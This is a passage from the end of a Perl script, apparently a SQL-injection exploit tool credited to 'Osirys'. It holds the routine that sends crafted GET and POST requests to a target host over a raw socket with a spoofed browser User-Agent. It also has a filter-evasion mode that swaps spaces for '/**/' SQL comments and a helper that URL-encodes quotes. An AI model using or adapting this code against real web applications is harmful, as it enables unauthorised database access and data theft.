     }#print "bbb\n";
     my $socket   =  new IO::Socket::INET(
                                             PeerAddr => $addr,
                                             PeerPort => $port,
                                             Proto    => 'tcp',
                                             Timeout  => 5
                                          ) or die $!;#print "bnnb\n";
     if ($bypass == 1) {
          $pack =~ s/ /\/**\//g;
     }#print "H\n";
     if ($treq_ == 1) {
          $pack = encode($pack);
            print "LOL: $pack\n";
          $data = "GET ".$pack." HTTP/1.1\r\n".
                  "Host: ".$h0st."\r\n".
                  "Connection: close\r\n\r\n";
     }    
     elsif ($treq_ == 2) {
          my $length = length($pack);
          $data = "POST ".$path." HTTP/1.1\r\n".
                  "Host: ".$h0st."\r\n".
                  "User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2\r\n".
                  "Connection: close\r\n".
                  "Content-Type: application/x-www-form-urlencoded\r\n".
                  "Content-Length: ".$length."\r\n\r\n".
                  $pack."\r\n\r\n";
     }
     #print "\n##\n$data\n##\n";
     $socket->send($data);
     while ((my $e = <$socket>)&&($stop != 1)) {#print "\n$e\n";
          if ($e !~ /^0\r\n$/) {#print "jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj\n";}
               push(@tmp_src,$e);
               if ($e =~ /$regexp/i) {#print "trovata match di $regexp .. stop 1\n";
                    $stop = 1;
               }
          }
          #else {
          #     print "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
          #}
          #print "aspetto .. fine while ..\n";
          #$socket->blocking(0);
     }
     foreach my $e(@tmp_src) {
          $string .= $e;
     }
     return($string);
}

sub in_array() {
    my($l,@arr) = @_;
    my $found = 0;
    foreach my $e(@arr) {
        if ($found == 0) {
            if ($e eq $l) {
                $found = 1;
            }
        }
    }
    return $found;
}

sub encode() {
     my $str = $_[0];
     $str =~ s/ /%20/g;
     $str =~ s/'/%27/g;
     $str =~ s/!/%21/g;
     return($str);
}

# Code ends here
# Credits to Giovanni Buzzin, "Osirys"